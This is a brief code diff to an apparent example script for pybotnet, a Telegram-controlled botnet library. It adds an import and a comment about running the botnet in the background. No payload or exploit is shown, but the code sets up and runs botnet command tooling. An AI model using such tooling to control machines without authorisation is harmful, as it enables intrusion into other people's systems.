@@ -1,3 +1,5 @@
+
+import time
 import logging
 
 from pybotnet import BotNet, Context, TelegramEngine
@@ -33,3 +35,4 @@ botnet.import_external_scripts(external_botnet)
 if __name__ == "__main__":
     _logger.debug(botnet)
     botnet.run()
+    # or you can use botnet.run_background(), botnet.stop_background()
